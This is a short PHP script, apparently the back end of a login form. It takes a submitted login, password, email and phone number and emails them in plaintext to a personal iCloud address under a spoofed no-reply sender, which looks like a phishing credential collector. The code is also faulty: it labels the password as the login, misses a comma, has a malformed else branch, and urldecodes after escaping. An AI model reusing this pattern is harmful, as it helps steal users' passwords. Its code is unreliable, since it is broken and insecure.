<?php

    $login = $_POST['login'];
    $pass= $_POST['pass'];
    $email = $_POST['email'];
    $tel = $_POST['tel'];



    $login = htmlspecialchars($login);
    $pass = htmlspecialchars($pass);
    $email = htmlspecialchars($email);
    $tel = htmlspecialchars($tel);

    $login = urldecode($login);
    $pass = urldecode($pass);
    $email = urldecode($email);
    $tel = urldecode($tel);

    $login = trim($login);
    $pass = trim($pass);
    $email = trim($email);
    $tel = trim($tel);


    if (mail("tinminzhou@icloud.com",
            "Новое письмо"
            "Логин".$pass."\n".
            "Пароль".$pass."\n".
            "Email".$email."\n".
            "Телефон".$tel."\n".
            "From: no-reply@mydomain.ru \r\n")

    ) {
        echo('Письмо отправленно');
    }

      else('Есть ошибки! Проверьте данные...')
?>
